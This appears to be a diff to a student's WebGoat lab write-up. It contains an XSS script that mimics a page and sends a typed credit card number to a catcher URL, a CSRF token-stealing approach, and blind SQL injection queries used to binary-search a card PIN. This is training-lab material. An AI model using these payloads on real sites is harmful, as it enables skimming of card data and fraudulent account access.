@@ -16,13 +16,14 @@ the browser.
 
 The script removes the message and sets the three digit access code as the
 default, so as to imitate the original screen. It adds an event listener to the
-form which sends a GET request with the credit card number on submit.
+form which sends a GET request with the credit card number on submit. Thus the
+page looks identical to the original page served by the same website.
 
 <script>
-	document.getElementByID('message').remove();
+	document.getElementById('message').remove();
 	const form = document.form;
 	form.addEventListener('submit', (event) => {
-		fetch(`http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=${form.input1.value}`);
+		fetch(`/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=${form.input1.value}`);
 	});
 	form.input2.value = '000';
 </script>
@@ -41,3 +42,16 @@ Since the attacking JS and the transfer page with the CSRF token live on the
 same domain, a JS request to the main transfer screen can read the token from
 the transfer page. A request is made to this page to retrieve the token, and
 another request is sent with the transfer amount and token.
+
+Part 8 Explanation:
+The query I used was in the form of either:
+1;SELECT * from credit WHERE cc_number = 1111222233334444 AND pin > X;
+1;SELECT * from credit WHERE cc_number = 1111222233334444 AND pin = X;
+
+If the first query returned "Account number is valid." we would know the pin is
+> X and if it was invalid we would know that pin <= X.
+
+I assumed the pin number was 4 digits, so I started with upper and lower bounds
+of 10000 and 0. Then I performed binary search using the first query until I
+found the pin was between 2362 and 2367, at which point I brute forced this
+within this small range.
